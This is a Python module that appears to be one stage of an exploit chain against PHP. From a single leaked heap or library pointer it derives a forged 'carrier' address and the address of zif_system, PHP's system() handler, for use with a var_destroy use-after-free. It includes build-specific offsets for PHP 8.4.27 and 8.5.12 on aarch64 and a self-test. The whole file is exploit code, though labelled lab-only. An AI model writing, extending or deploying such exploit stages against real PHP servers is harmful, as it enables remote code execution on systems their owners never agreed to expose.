"""Plan B leak-shim: one leaked pointer -> carrier + zif_system.

The var_destroy re-entry UAF is an *amplifier*: it needs exactly one address
to bootstrap. This module is the seam that makes the rest of the chain
build-generic. Any of these seed kinds is accepted:

  main    a pointer inside the ZendMM 2 MiB main chunk (or the chunk base)
  chunk   same as `main` (aligned down to 2 MiB)
  carrier the forged carrier address directly
  lib     a libphp text pointer (needs the caller's symbol offset to get the
          base; pass `lib_base` explicitly instead when deriving zif)

Derivation:
  carrier = align_2m(seed) + profile["vd_carrier_delta"]   (fresh worker)
  zif      = lib_base + profile["zif_system"]

A build without a calibrated delta raises rather than guessing -- the whole
point of the leak-shim is to never invent an address.

Lab-only. No command execution, no network.
"""

from __future__ import annotations

MAIN_MASK = ~0x1FFFFF   # ZendMM main chunk is 2 MiB aligned


class SeedError(RuntimeError):
    pass


def align_main(ptr):
    return ptr & MAIN_MASK


def carrier_from(seed, kind, profile):
    """Return the forged carrier address for a single leaked `seed`.

    kind: main | chunk | carrier.
    profile: a normalized build profile (needs `vd_carrier_delta`).
    """
    if seed is None or seed == 0:
        raise SeedError("empty seed")
    if kind == "carrier":
        return seed
    if kind not in ("main", "chunk"):
        raise SeedError(f"unsupported seed kind {kind!r}")
    delta = profile.get("vd_carrier_delta")
    if delta is None:
        raise SeedError(
            "no fresh-worker carrier delta calibrated for "
            f"{profile.get('php_version')}/{profile.get('arch')}")
    return align_main(seed) + delta


def main_from(seed, kind):
    if kind == "carrier":
        return None
    return align_main(seed)


def zif_from(lib_base, profile, bias=0):
    off = profile.get("zif_system")
    if lib_base is None or off is None:
        raise SeedError("need libphp base and a zif_system offset")
    return lib_base + off + bias


def derive(seed, kind, profile, lib_base=None, bias=0):
    """One call for the whole front-end. Returns {main, carrier, zif}."""
    out = {"main": main_from(seed, kind),
           "carrier": carrier_from(seed, kind, profile),
           "zif": None}
    if lib_base is not None:
        out["zif"] = zif_from(lib_base, profile, bias)
    return out


# --------------------------------------------------------------------------
# self-test (offline)
# --------------------------------------------------------------------------
def _self_test():
    prof = {"php_version": "8.4.27", "arch": "aarch64",
            "vd_carrier_delta": 0x6A018, "zif_system": 0x42CD70}
    main = 0xFFFFABC00000
    got = derive(main + 0x1234, "main", prof, lib_base=0xFFFFADD90000)
    assert got["main"] == main, got
    assert got["carrier"] == main + 0x6A018, got
    assert got["zif"] == 0xFFFFADD90000 + 0x42CD70, got

    prof8512 = dict(prof, php_version="8.5.12", vd_carrier_delta=0x7B018)
    assert carrier_from(0xFFFFBC400000, "chunk", prof8512) == 0xFFFFBC400000 + 0x7B018

    # a build with no delta must refuse, not guess
    try:
        carrier_from(0xFFFF00000000, "main",
                     dict(prof, vd_carrier_delta=None))
    except SeedError:
        pass
    else:
        raise AssertionError("uncalibrated build did not raise")

    # carrier seed is returned verbatim, main is unknown
    assert derive(0xDEADB000, "carrier", prof)["carrier"] == 0xDEADB000

    print("[ok] vdseed self-test (main/chunk/carrier, uncalibrated refusal)")


if __name__ == "__main__":
    import sys
    if "--self-test" in sys.argv:
        _self_test()
    else:
        print(__doc__)
